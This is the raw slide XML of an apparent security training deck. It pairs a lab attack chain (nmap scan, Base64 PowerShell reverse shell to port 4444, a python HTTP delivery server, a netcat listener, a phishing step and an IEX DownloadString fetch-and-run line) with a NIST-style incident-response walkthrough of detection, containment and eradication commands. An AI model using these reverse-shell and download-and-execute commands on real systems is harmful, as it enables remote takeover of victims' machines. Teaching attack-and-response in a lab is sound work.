y="297180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11475720" y="297180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1795760" y="2971800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10515600" y="329183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0835640" y="329183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1155680" y="329183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11475720" y="329183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1795760" y="3291839"/>
            <a:ext cx="54864" cy="54864"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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57200" y="182880"/>
            <a:ext cx="2194560" cy="301752"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 66666"/>
            </a:avLst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0352" y="219456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2 — ATTACK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943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Kali Linux — Automated Attack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1261872"/>
            <a:ext cx="4572000" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect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65760" y="1389888"/>
            <a:ext cx="2103120" cy="1874519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1197864" y="1481328"/>
            <a:ext cx="438912" cy="43891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97864" y="1481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20299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239572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Ping + Nmap
ports &amp; services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68879" y="2286000"/>
            <a:ext cx="256032" cy="45720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="608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724912" y="1389888"/>
            <a:ext cx="2103120" cy="1874519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3557016" y="1481328"/>
            <a:ext cx="438912" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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557016" y="1481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16352" y="20299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PAYLOAD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16352" y="239572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Build PowerShell
reverse shell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828031" y="2286000"/>
            <a:ext cx="256032" cy="45720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="608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084064" y="1389888"/>
            <a:ext cx="2103120" cy="1874519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5916168" y="1481328"/>
            <a:ext cx="438912" cy="438912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916168" y="1481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75504" y="20299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DELIVER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75504" y="239572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 server
port 8080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87184" y="2286000"/>
            <a:ext cx="256032" cy="45720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="608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443216" y="1389888"/>
            <a:ext cx="2103120" cy="1874519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8275320" y="1481328"/>
            <a:ext cx="438912" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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275320" y="1481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34656" y="20299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3D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LISTEN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34656" y="239572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Netcat listener
nc -lvnp 4444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46336" y="2286000"/>
            <a:ext cx="256032" cy="45720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="608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802368" y="1389888"/>
            <a:ext cx="2103120" cy="1874519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B4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10634472" y="1481328"/>
            <a:ext cx="438912" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/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634472" y="1481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93808" y="20299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B46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SHELL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93808" y="2395728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Windows shell
opens on Kali!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33649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sudo bash kali_attack.sh   [Run as root on Kali Linux]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3730752"/>
            <a:ext cx="11247120" cy="283464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566928" y="3813048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768096" y="381304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969264" y="3813048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197864" y="4160519"/>
            <a:ext cx="10972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# Phase 1 — Reconnaissance
nmap -sV -T4 -p 80,135,445,3389,4444 &lt;WIN_IP&gt;  -oN nmap_scan.txt
# Phase 2 — Generate PowerShell payload (Base64, no EXE)
PS_RAW="\$client=New-Object Net.Sockets.TCPClient('$KALI_IP',4444)..."
PS_B64=$(echo -n "$PS_RAW" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)
# Phase 3 — HTTP server to deliver payload
cd /tmp &amp;&amp; python3 -m http.server 8080 &amp;
# Phase 4 — Start Netcat listener
nc -lvnp 4444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82880"/>
            <a:ext cx="3200400" cy="301752"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 66666"/>
            </a:avLst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0352" y="219456"/>
            <a:ext cx="3054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3 — SOCIAL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Reverse Shell via Phishing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61872"/>
            <a:ext cx="4572000" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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5303520" cy="5230368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81713" y="170078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3D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Victim — Windows 10</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Oval 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1508760" y="2396579"/>
            <a:ext cx="365760" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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23965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2414868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Attacker sends phishing link or file</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Oval 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1508760" y="3018372"/>
            <a:ext cx="365760" cy="365760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30183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3036660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Victim opens PowerShell as Administrator</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Oval 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1508760" y="3640163"/>
            <a:ext cx="365760" cy="365760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36401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4248" y="3658452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Victim pastes the encoded command</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Oval 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1508760" y="4261956"/>
            <a:ext cx="365760" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/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08760" y="42619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4248" y="4280244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Payload executes silently in background</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Oval 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1508760" y="4883748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08760" y="48837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84248" y="4902036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Reverse TCP connects to Kali port 4444</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Oval 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1508760" y="5505540"/>
            <a:ext cx="365760" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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8760" y="55055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84248" y="5523828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Attacker gets full interactive Windows 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1417320"/>
            <a:ext cx="5760720" cy="5230368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98080" y="1691639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Commands on Windows PowerShell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208483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Option A — One-liner (no file needed):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2468880"/>
            <a:ext cx="5623560" cy="77724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144768" y="2551176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345936" y="255117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547104" y="2551176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99631" y="2724912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powershell -NoP -NonI -W Hidden -Exec Bypass -Enc &lt;BASE64&gt;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401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Option B — Download and run .ps1 file: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3794760"/>
            <a:ext cx="5623560" cy="96012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144768" y="3877056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6345936" y="387705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6547104" y="3877056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99631" y="4050792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IEX(New-Object Net.WebClient).DownloadString(
  'http://192.168.216.129:8080/update.ps1')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4892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Kali receives connection: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5257800"/>
            <a:ext cx="5623560" cy="109728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6144768" y="5340096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6345936" y="5340096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6547104" y="5340096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199631" y="5513832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Listening on 0.0.0.0 4444
Connection from 192.168.216.X
PS C:\Windows\system32&gt;  _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7432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28016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228600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329184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29768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30352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30936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31520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32104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32688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33272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133856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274320" y="630936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280160" y="630936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286000" y="630936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3291840" y="630936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297680" y="630936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5303520" y="630936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309360" y="630936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315200" y="630936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321040" y="630936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9326880" y="630936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0332720" y="630936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1338560" y="630936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274320" y="731520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280160" y="731520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2286000" y="731520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3291840" y="731520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297680" y="731520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303520" y="731520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309360" y="731520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7315200" y="731520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8321040" y="731520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326880" y="731520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332720" y="731520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1338560" y="731520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IR FRAMEWORK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943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5-Phase Incident Response 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NIST SP 800-61 Rev. 2  |  19 Total Steps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1691640"/>
            <a:ext cx="2176272" cy="4937760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188719" y="1828800"/>
            <a:ext cx="438912" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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88719" y="18288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79" y="235915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3D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IDENTIFICATION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79" y="2834640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Steps 1-4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3182112"/>
            <a:ext cx="1810512" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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21207" y="3383280"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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5800" y="331927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Find port 4444 connection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Oval 53"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="521207" y="3977640"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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85800" y="391363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Map PIDs to processes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="Oval 55"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="521207" y="4572000"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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85800" y="450799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Extract executable paths</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58" name="Oval 57"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="521207" y="5166360"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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85800" y="510235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Detect process injection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97480" y="1691640"/>
            <a:ext cx="2176272" cy="4937760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3566160" y="1828800"/>
            <a:ext cx="438912" cy="438912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566160" y="18288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88920" y="235915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CONTAINMENT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88920" y="2834640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Steps 5-7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80360" y="3182112"/>
            <a:ext cx="1810512" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA0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2898648" y="3383280"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA00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063240" y="331927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Isolate machine from network</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="Oval 68"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2898648" y="3977640"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA00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063240" y="391363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Suspend malicious processes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="Oval 70"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2898648" y="4572000"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA00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063240" y="450799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 attacker IP via firewall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74920" y="1691640"/>
            <a:ext cx="2176272" cy="4937760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B4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5943600" y="1828800"/>
            <a:ext cx="438912" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/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943600" y="18288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66359" y="235915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B46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ERADICATION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66359" y="2834640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Steps 8-13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57800" y="3182112"/>
            <a:ext cx="1810512" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B460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5276088" y="3383280"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B460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440680" y="331927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Terminate processes (taskkill)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82" name="Oval 81"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5276088" y="3977640"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B460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440680" y="391363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Locate &amp; hash payload</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84" name="Oval 83"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5276088" y="4572000"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B460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440680" y="450799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Delete malicious files</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="86" name="Oval 85"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5276088" y="5166360"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B460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440680" y="510235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Clean registry AutoRun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52360" y="1691640"/>
            <a:ext cx="2176272" cy="4937760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8321040" y="1828800"/>
            <a:ext cx="438912" cy="43891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321040" y="18288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43800" y="235915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RECOVERY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543800" y="2834640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Steps 14-16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635240" y="3182112"/>
            <a:ext cx="1810512" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect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7653528" y="3383280"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00D4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818120" y="331927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 offline AV/EDR scan</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="Oval 96"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7653528" y="3977640"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00D4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818120" y="391363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Re-enable network adapter</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="Oval 98"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7653528" y="4572000"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00D4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818120" y="450799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Monitor 24h — no beaconing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29800" y="1691640"/>
            <a:ext cx="2176272" cy="4937760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10698480" y="1828800"/>
            <a:ext cx="438912" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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0698480" y="18288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921240" y="235915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POST-INCIDENT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21240" y="2834640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Steps 17-19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12680" y="3182112"/>
            <a:ext cx="1810512" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E57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10030968" y="3383280"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E5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195560" y="331927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Detect clearev (Event 1102)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110" name="Oval 109"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10030968" y="3977640"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E5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0195560" y="391363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Audit logon events 4624/4672</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112" name="Oval 111"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10030968" y="4572000"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E57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195560" y="4507992"/>
            <a:ext cx="17190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Compile full IR report &amp; timeline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241280" y="91440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561319" y="91440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881359" y="91440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11201400" y="91440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521440" y="91440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241280" y="123444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561319" y="123444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881359" y="123444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1201400" y="123444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521440" y="123444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241280" y="155448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561319" y="155448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881359" y="155448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201400" y="155448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1521440" y="155448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241280" y="187451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561319" y="187451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881359" y="187451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201400" y="187451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1521440" y="187451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241280" y="219456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0561319" y="219456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0881359" y="219456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1201400" y="219456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1521440" y="219456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241280" y="251460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561319" y="251460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881359" y="251460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1201400" y="251460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1521440" y="251460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241280" y="283463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0561319" y="283463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0881359" y="283463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1201400" y="283463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1521440" y="283463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241280" y="315467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0561319" y="315467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0881359" y="315467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11201400" y="315467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1521440" y="3154679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10241280" y="347472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0561319" y="347472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0881359" y="347472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11201400" y="347472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1521440" y="3474720"/>
            <a:ext cx="54864" cy="54864"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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57200" y="182880"/>
            <a:ext cx="1828800" cy="301752"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 66666"/>
            </a:avLst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0352" y="219456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1 OF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94360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3D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Identification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 &amp; Network Analysis  |  Steps 1 - 4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1664208"/>
            <a:ext cx="11247120" cy="896112"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 93333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E2244"/>
          </a:solidFill>
          <a:ln w="889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502920" y="1901952"/>
            <a:ext cx="411480" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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02920" y="1901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" y="17739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Verify malicious network connections on port 4444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97880" y="1709928"/>
            <a:ext cx="5577840" cy="804672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6007608" y="179222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6208776" y="179222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6409944" y="179222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062472" y="1965960"/>
            <a:ext cx="5303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netstat -ano | findstr "4444"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670048"/>
            <a:ext cx="11247120" cy="896112"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 93333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E2244"/>
          </a:solidFill>
          <a:ln w="889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502920" y="2907791"/>
            <a:ext cx="411480" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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02920" y="290779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" y="277977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child processes from suspicious parent PID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97880" y="2715768"/>
            <a:ext cx="5577840" cy="804672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6007608" y="2798063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6208776" y="2798063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409944" y="2798063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062472" y="2971800"/>
            <a:ext cx="5303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wmic process where (ParentProcessId=&lt;PID&gt;) get Name, ProcessId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3675888"/>
            <a:ext cx="11247120" cy="896112"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 93333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E2244"/>
          </a:solidFill>
          <a:ln w="889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502920" y="3913632"/>
            <a:ext cx="411480" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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02920" y="39136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" y="378561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Identify process name from each suspicious PID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97880" y="3721608"/>
            <a:ext cx="5577840" cy="804672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6007608" y="380390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6208776" y="380390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6409944" y="380390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062472" y="3977640"/>
            <a:ext cx="5303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tasklist /fi "pid eq &lt;pid1&gt;"
tasklist /fi "pid eq &lt;pid2&gt;"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681728"/>
            <a:ext cx="11247120" cy="896112"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 93333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E2244"/>
          </a:solidFill>
          <a:ln w="889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502920" y="4919472"/>
            <a:ext cx="411480" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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02920" y="4919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" y="479145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Extract executable path and command-line of injected process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97880" y="4727448"/>
            <a:ext cx="5577840" cy="804672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6007608" y="480974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6208776" y="480974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6409944" y="480974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062472" y="4983480"/>
            <a:ext cx="5303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wmic process where processid=&lt;pid&gt; get name,executablepath,commandline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5760" y="5687568"/>
            <a:ext cx="11247120" cy="896112"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 93333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E2244"/>
          </a:solidFill>
          <a:ln w="889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502920" y="5925312"/>
            <a:ext cx="411480" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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02920" y="59253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1560" y="57972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Detect injection via parent-child relationship mapping (PowerShell)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897880" y="5733288"/>
            <a:ext cx="5577840" cy="804672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6007608" y="581558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6208776" y="581558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6409944" y="581558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062472" y="5989320"/>
            <a:ext cx="5303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Get-CimInstance Win32_Process
  | Select ProcessId, ParentProcessId, Name
  | Where-Object ProcessId -in &lt;pid1&gt;, &lt;pid2&gt;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241280" y="91440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561319" y="91440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881359" y="91440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11201400" y="91440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521440" y="91440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241280" y="123444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561319" y="123444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881359" y="123444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1201400" y="123444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521440" y="123444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241280" y="155448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561319" y="155448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881359" y="155448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201400" y="155448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1521440" y="155448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241280" y="187451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561319" y="187451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881359" y="187451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201400" y="187451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1521440" y="187451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241280" y="219456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0561319" y="219456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0881359" y="219456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1201400" y="219456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1521440" y="219456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241280" y="251460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561319" y="251460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881359" y="251460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1201400" y="251460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1521440" y="251460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241280" y="283463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0561319" y="283463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0881359" y="283463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1201400" y="283463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1521440" y="283463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241280" y="315467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0561319" y="315467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0881359" y="315467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11201400" y="315467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1521440" y="3154679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10241280" y="347472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0561319" y="347472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0881359" y="347472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11201400" y="347472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1521440" y="3474720"/>
            <a:ext cx="54864" cy="54864"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA0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57200" y="182880"/>
            <a:ext cx="1828800" cy="301752"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 66666"/>
            </a:avLst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0352" y="219456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50F1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2 OF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94360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Containment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Isolation &amp; Evidence Preservation  |  Steps 5 - 7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1664208"/>
            <a:ext cx="11247120" cy="157276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502920" y="2231136"/>
            <a:ext cx="438912" cy="438912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02920" y="223113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" y="177393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Isolate machine from network — immediately sever reverse shell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5840" y="2258568"/>
            <a:ext cx="7772400" cy="804672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1115568" y="234086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1316736" y="23408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1517904" y="234086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70432" y="2514600"/>
            <a:ext cx="74980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Disable-NetAdapter -Name "*" -Confirm:$false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869680" y="2258568"/>
            <a:ext cx="2606040" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 80000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="221200"/>
          </a:solidFill>
          <a:ln w="889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9006840" y="2350008"/>
            <a:ext cx="256032" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA0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006840" y="23500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!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2322576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Cuts attacker access instantly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3355848"/>
            <a:ext cx="11247120" cy="157276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502920" y="3922776"/>
            <a:ext cx="438912" cy="438912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02920" y="392277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8992" y="346557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Suspend malicious processes — preserve memory for forensics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5840" y="3950208"/>
            <a:ext cx="7772400" cy="804672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1115568" y="403250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1316736" y="403250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1517904" y="403250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170432" y="4206240"/>
            <a:ext cx="74980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Suspend-Process -Id &lt;pid1&gt;
Suspend-Process -Id &lt;pid2&gt;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69680" y="3950208"/>
            <a:ext cx="2606040" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 80000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="221200"/>
          </a:solidFill>
          <a:ln w="889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9006840" y="4041648"/>
            <a:ext cx="256032" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA0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006840" y="404164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!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26880" y="4014215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Don't kill — memory state is evidence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047488"/>
            <a:ext cx="11247120" cy="157276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502920" y="5614416"/>
            <a:ext cx="438912" cy="438912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02920" y="561441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8992" y="515721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host-based firewall rule blocking attacker IP &amp; port 4444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5840" y="5641848"/>
            <a:ext cx="7772400" cy="86868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1115568" y="572414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1316736" y="572414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1517904" y="572414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170432" y="58978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New-NetFirewallRule -DisplayName "IR_Block_Port4444"
  -Direction Outbound -LocalPort 4444 -Protocol TCP -Action Block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869680" y="5641848"/>
            <a:ext cx="2606040" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 80000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="221200"/>
          </a:solidFill>
          <a:ln w="889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9006840" y="5733288"/>
            <a:ext cx="256032" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA0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006840" y="57332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!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26880" y="5705856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Defense-in-depth even while isolated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241280" y="91440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561319" y="91440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881359" y="91440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11201400" y="91440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521440" y="91440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241280" y="123444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561319" y="123444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881359" y="123444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1201400" y="123444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521440" y="123444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241280" y="155448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561319" y="155448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881359" y="155448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201400" y="155448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1521440" y="155448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241280" y="187451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561319" y="187451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0881359" y="187451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201400" y="187451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1521440" y="187451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241280" y="219456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0561319" y="219456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0881359" y="219456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1201400" y="219456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1521440" y="219456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241280" y="251460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561319" y="251460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881359" y="251460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1201400" y="251460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1521440" y="251460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241280" y="283463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0561319" y="283463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0881359" y="283463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1201400" y="283463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1521440" y="283463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241280" y="315467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0561319" y="315467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0881359" y="315467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11201400" y="315467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1521440" y="3154679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10241280" y="347472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0561319" y="347472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0881359" y="347472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11201400" y="347472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1521440" y="3474720"/>
            <a:ext cx="54864" cy="54864"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B460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57200" y="182880"/>
            <a:ext cx="1828800" cy="301752"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 66666"/>
            </a:avLst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0352" y="219456"/>
            <a:ext cx="16824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3 OF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94360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B46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Eradication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Threat Neutralization  |  Steps 8 - 13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1664208"/>
            <a:ext cx="5577840" cy="157276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B4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464143" y="1883664"/>
            <a:ext cx="420624" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/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67233" y="1931247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" y="177393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Terminate malicious processes permanently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2304288"/>
            <a:ext cx="5303520" cy="82296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612648" y="238658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813816" y="238658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1014984" y="238658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67512" y="2560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taskkill /F /PID &lt;pid1&gt;
taskkill /F /PID &lt;pid2&gt;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1664208"/>
            <a:ext cx="5577840" cy="157276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B4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314607" y="1874519"/>
            <a:ext cx="420624" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/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304787" y="1931247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177393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Locate initial phishing payload on disk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304288"/>
            <a:ext cx="5303520" cy="82296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6419088" y="238658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6620256" y="238658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821424" y="238658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473952" y="2560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dir /s /b "%USERPROFILE%\Downloads\SecurityUpdate.exe"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3401568"/>
            <a:ext cx="5577840" cy="157276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B4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519684" y="3603486"/>
            <a:ext cx="420624" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/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12064" y="3667494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" y="351129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Generate SHA256 hash of payload as IoC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4041648"/>
